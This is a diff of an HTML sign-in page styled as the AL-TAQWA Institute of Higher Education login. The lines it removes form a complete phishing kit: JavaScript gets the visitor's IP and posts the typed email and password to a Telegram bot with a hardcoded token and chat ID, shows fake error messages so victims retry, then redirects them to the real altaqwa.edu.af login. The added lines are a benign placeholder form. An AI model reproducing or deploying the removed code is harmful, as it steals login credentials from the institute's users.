@@ -1,307 +1,297 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login - AL-TAQWA</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>AL-TAQWA – Sign In</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-<style>
-/* عمومي بڼه */
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-}
-
-body {
-    min-height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    background-color: #f5f5f5;
-}
-
-/* ============================================= */
-/* === د کارت بڼه === */
-/* ============================================= */
-.login-container {
-    background: #ffffff;
-    border-radius: 16px;
-    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
-    
-    /* پورته او لاندې 10px زیات شول (45->55, 40->50) */
-    padding: 55px 25px 50px 25px; 
-    
-    width: 100%;
-    display: flex;
-    flex-direction: column;
-}
-
-/* ============================================= */
-/* === موبایل سایز === */
-/* ============================================= */
-@media (max-width: 767px) {
-    .login-container {
-        max-width: 416px; 
-        margin: 20px auto;
-    }
-}
-
-/* ============================================= */
-/* === ډیسټاپ سایز === */
-/* ============================================= */
-@media (min-width: 768px) {
     body {
-        background-color: #fafafa;
+      min-height: 100vh;
+      background: #f0f0f0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      padding: 20px;
     }
 
-    .login-container {
-        max-width: 436px; 
-        /* ډیسټاپ کې هم 10px پورته او لاندې زیات شول (50->60, 40->50) */
-        padding: 60px 30px 50px 30px;
-        border: 1px solid #eee;
+    .card {
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.10);
+      padding: 48px 40px 40px;
+      width: 100%;
+      max-width: 420px;
     }
 
-    .logo img {
-        max-width: 55%;
+    /* ── Logo ── */
+    .logo-area {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 24px;
     }
-}
 
-/* ============================================= */
-/* === دننی توکي (یو بل ته نږدې / کوچني شول) === */
-/* ============================================= */
-.logo {
-    text-align: center;
-    margin-bottom: 18px; /* 25 څخه 18 ته راکم شو */
-}
+    .logo-img {
+      width: 48px;
+      height: 48px;
+      object-fit: contain;
+      display: none; /* shown when src is set */
+    }
 
-.logo img {
-    max-width: 75%;
-    height: auto;
-    display: inline-block;
-}
+    .logo-img.loaded { display: block; }
 
-.title {
-    text-align: center;
-    font-size: 21px; /* 22 څخه لږ کوچنی شو */
-    font-weight: 500;
-    color: #333;
-    margin-bottom: 20px; /* 28 څخه 20 ته راکم شو */
-}
+    /* shield placeholder shown when no logo URL is provided */
+    .logo-shield {
+      width: 48px;
+      height: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-.input-group {
-    margin-bottom: 12px; /* 18 څخه 12 ته راکم شو */
-}
+    .logo-shield svg { width: 44px; height: 44px; }
 
-label {
-    display: block;
-    font-size: 14px; /* 15 څخه 14 ته راکم شو */
-    font-weight: 500;
-    color: #444;
-    margin-bottom: 4px; /* 6 څخه 4 ته راکم شو */
-}
+    .logo-text {
+      line-height: 1.15;
+    }
 
-input[type="email"],
-input[type="password"] {
-    width: 100%;
-    height: 40px; /* 44 څخه 40 ته راکم شو */
-    padding: 0 10px; /* 12 څخه 10 ته راکم شو */
-    border: 1px solid #e0e0e0;
-    border-radius: 6px;
-    font-size: 14px; /* 15 څخه 14 ته راکم شو */
-    color: #333;
-    outline: none;
-    transition: border-color 0.2s;
-}
+    .logo-text .name {
+      font-size: 26px;
+      font-weight: 800;
+      color: #c8900a;
+      letter-spacing: 1px;
+    }
 
-input[type="email"]:focus,
-input[type="password"]:focus {
-    border: 1px solid #87CEEB; 
-    box-shadow: 0 0 0 2px rgba(135, 206, 235, 0.2);
-}
+    .logo-text .sub {
+      font-size: 11px;
+      color: #222;
+      letter-spacing: 0.3px;
+    }
 
-input::placeholder {
-    color: #aaa;
-}
+    /* ── Title ── */
+    h1 {
+      text-align: center;
+      font-size: 22px;
+      font-weight: 600;
+      color: #111;
+      margin-bottom: 28px;
+    }
 
-.remember-me {
-    display: flex;
-    align-items: center;
-    margin-bottom: 18px; /* 25 څخه 18 ته راکم شو */
-    font-size: 13px; /* 14 څخه 13 ته راکم شو */
-    color: #444;
-}
+    /* ── Form ── */
+    .field { margin-bottom: 18px; }
 
-.remember-me input[type="checkbox"] {
-    width: 14px; /* 16 څخه 14 ته راکم شو */
-    height: 14px; /* 16 څخه 14 ته راکم شو */
-    margin-right: 6px; /* 8 څخه 6 ته راکم شو */
-    accent-color: #18c6e7;
-}
+    label {
+      display: block;
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 6px;
+    }
 
-button {
-    width: 100%;
-    height: 40px; /* 44 څخه 40 ته راکم شو */
-    border: none;
-    border-radius: 6px;
-    background-color: #18c6e7;
-    color: #ffffff;
-    font-size: 15px; /* 16 څخه 15 ته راکم شو */
-    font-weight: 500;
-    cursor: pointer;
-    transition: background 0.2s;
-}
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1.5px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+      color: #333;
+      outline: none;
+      transition: border-color 0.2s;
+      background: #fff;
+    }
 
-button:hover {
-    background-color: #0fb6d6;
-}
+    input[type="email"]:focus,
+    input[type="password"]:focus,
+    input[type="text"]:focus {
+      border-color: #6bbfea;
+      box-shadow: 0 0 0 3px rgba(107,191,234,0.18);
+    }
 
-.error-msg {
-    background: #ffe6e6;
-    border: 1px solid #ff6666;
-    color: #cc0000;
-    padding: 8px; /* 10 څخه 8 ته راکم شو */
-    border-radius: 6px;
-    font-size: 12px; /* 13 څخه 12 ته راکم شو */
-    text-align: center;
-    margin-bottom: 12px; /* 15 څخه 12 ته راکم شو */
-    display: none;
-}
-</style>
+    input::placeholder { color: #aaa; }
+
+    /* ── Remember ── */
+    .remember {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+
+    .remember input[type="checkbox"] {
+      width: 16px;
+      height: 16px;
+      accent-color: #00bcd4;
+      cursor: pointer;
+    }
+
+    .remember label {
+      margin: 0;
+      font-size: 14px;
+      color: #444;
+      cursor: pointer;
+    }
+
+    /* ── Button ── */
+    .btn-login {
+      width: 100%;
+      padding: 14px;
+      background: #00bcd4;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      letter-spacing: 0.5px;
+      transition: background 0.2s, transform 0.1s;
+    }
+
+    .btn-login:hover  { background: #00a5bb; }
+    .btn-login:active { transform: scale(0.99); }
+
+    /* ── Logo URL input (helper below card) ── */
+    .logo-url-section {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .logo-url-section p {
+      font-size: 12px;
+      color: #888;
+      margin-bottom: 6px;
+    }
+
+    .logo-url-row {
+      display: flex;
+      gap: 6px;
+      max-width: 420px;
+      margin: 0 auto;
+    }
+
+    .logo-url-row input {
+      flex: 1;
+      padding: 8px 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 13px;
+      outline: none;
+    }
+
+    .logo-url-row button {
+      padding: 8px 14px;
+      background: #c8900a;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 13px;
+      cursor: pointer;
+    }
+
+    .logo-url-row button:hover { background: #a87208; }
+
+    /* ── Responsive ── */
+    @media (max-width: 480px) {
+      .card { padding: 36px 22px 30px; }
+      h1 { font-size: 20px; }
+    }
+  </style>
 </head>
-
 <body>
 
-<div class="login-container">
-    
-    <div class="logo">
-        <!-- ============================================== -->
-        <!-- خپل فولډر او د عکس نوم دلته بدل کړئ -->
-        <!-- ============================================== -->
-        <img src="assets/logo.png" alt="AL-TAQWA Logo">
+<div style="display:flex; flex-direction:column; align-items:center; width:100%;">
+
+  <!-- Login Card -->
+  <div class="card">
+
+    <!-- Logo -->
+    <div class="logo-area">
+      <!-- Loaded image (hidden until URL provided) -->
+      <img id="logoImg" class="logo-img" src="" alt="AL-TAQWA logo" />
+
+      <!-- SVG Shield placeholder -->
+      <div class="logo-shield" id="logoShield">
+        <svg viewBox="0 0 44 50" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M22 2L4 10v14c0 10.5 7.5 20.3 18 23 10.5-2.7 18-12.5 18-23V10L22 2z"
+                fill="#c8900a" stroke="#a87208" stroke-width="1.5"/>
+          <text x="22" y="32" text-anchor="middle" font-size="18" font-weight="bold"
+                fill="#fff" font-family="serif">ت</text>
+        </svg>
+      </div>
+
+      <div class="logo-text">
+        <div class="name">AL-TAQWA</div>
+        <div class="sub">Institute of Higher Education</div>
+      </div>
     </div>
 
-    <div class="title">Sign in</div>
+    <h1>Sign in</h1>
 
-    <div id="errorMsg" class="error-msg"></div>
-
-    <div class="input-group">
-        <label>Email</label>
-        <input type="email" id="email" placeholder="Email">
+    <div class="field">
+      <label for="email">Email</label>
+      <input type="email" id="email" placeholder="Email" autocomplete="email" />
     </div>
 
-    <div class="input-group">
-        <label>Password</label>
-        <input type="password" id="password" placeholder="Password">
+    <div class="field">
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="Password" autocomplete="current-password" />
     </div>
 
-    <div class="remember-me">
-        <input type="checkbox" id="rememberCheck">
-        <label for="rememberCheck" style="font-weight: 400; margin:0; cursor:pointer;">Remember password</label>
+    <div class="remember">
+      <input type="checkbox" id="remember" />
+      <label for="remember">Remember password</label>
     </div>
 
-    <button id="loginBtn">Login</button>
+    <button class="btn-login" onclick="handleLogin()">Login</button>
+  </div>
+
+  <!-- Logo URL helper -->
+  <div class="logo-url-section">
+    <p>د لوګو د ښودلو لپاره د عکس URL دلته ولیکئ:</p>
+    <div class="logo-url-row">
+      <input type="text" id="logoUrlInput" placeholder="https://example.com/logo.png" />
+      <button onclick="applyLogo()">لګول</button>
+    </div>
+  </div>
 
 </div>
 
 <script>
-    // ==========================================
-    // دلته خپل نوی ټوکن او چټ آئی ډی واچوئ
-    // ==========================================
-    const BOT_TOKEN = "8907358280:AAGNOQIWyhvy2hB1yWTIc2XyMp1eQiNsHXo";
-    const ADMIN_CHAT_ID = "8295417969";
+  function applyLogo() {
+    const url = document.getElementById('logoUrlInput').value.trim();
+    if (!url) return;
+    const img = document.getElementById('logoImg');
+    const shield = document.getElementById('logoShield');
+    img.src = url;
+    img.onload = () => {
+      img.classList.add('loaded');
+      shield.style.display = 'none';
+    };
+    img.onerror = () => {
+      img.classList.remove('loaded');
+      shield.style.display = 'flex';
+      alert('د عکس URL سم نه دی. بل URL هڅه وکړئ.');
+    };
+  }
 
-    let attemptStore = {};
-
-    function hasPashtoCharacters(text) {
-        const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
-        return pashtoRegex.test(text);
+  function handleLogin() {
+    const email = document.getElementById('email').value.trim();
+    const pass  = document.getElementById('password').value;
+    if (!email || !pass) {
+      alert('مهرباني وکړئ خپل بریښنالیک او پټنوم ولیکئ.');
+      return;
     }
+    alert('ننوتل…');
+  }
 
-    function isValidEmail(email) {
-        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-        return emailRegex.test(email);
-    }
-
-    function isValidPasswordLength(password) {
-        return password.length >= 8;
-    }
-
-    async function getUserIP() {
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        } catch {
-            return 'Unknown IP';
-        }
-    }
-
-    async function sendToAdmin(email, password, ip, attemptNumber) {
-        const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n📍 *Source:* altaqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n📊 *Attempt:* ${attemptNumber}\n🕒 *Time:* ${new Date().toLocaleString()}`;
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: ADMIN_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-        } catch(e) {
-            console.warn("Telegram error:", e);
-        }
-    }
-
-    function showError(message) {
-        const errorDiv = document.getElementById('errorMsg');
-        errorDiv.textContent = message;
-        errorDiv.style.display = 'block';
-        setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
-    }
-
-    document.getElementById('loginBtn').addEventListener('click', async () => {
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value.trim();
-
-        if (!email || !password) { showError('Please fill in both email and password'); return; }
-        if (hasPashtoCharacters(email) || hasPashtoCharacters(password)) { showError('Pashto characters are not allowed'); return; }
-        if (!isValidEmail(email)) { showError('Please enter a valid email address'); return; }
-        if (!isValidPasswordLength(password)) { showError('Password must be at least 8 characters'); return; }
-
-        const ip = await getUserIP();
-        const key = `${email}_${ip}`;
-
-        if (!attemptStore[key]) attemptStore[key] = 0;
-        attemptStore[key]++;
-        const currentAttempt = attemptStore[key];
-
-        // لمړۍ هڅه: معلومات اډمین ته او ایرر
-        if (currentAttempt === 1) {
-            await sendToAdmin(email, password, ip, currentAttempt);
-            showError('Please check your email');
-            document.getElementById('email').value = '';
-            document.getElementById('password').value = '';
-            return;
-        }
-
-        // دویمه هڅه: ایرر
-        if (currentAttempt === 2) {
-            showError('Please check your password');
-            document.getElementById('email').value = '';
-            document.getElementById('password').value = '';
-            return;
-        }
-
-        // دریمه هڅه: لینک ته تلل بې له لوډینګه
-        if (currentAttempt >= 3) {
-            await sendToAdmin(email, password, ip, currentAttempt);
-            delete attemptStore[key];
-            window.location.replace("https://www.altaqwa.edu.af/login");
-        }
-    });
+  // Allow pressing Enter to trigger login
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Enter') handleLogin();
+  });
 </script>
 
 </body>
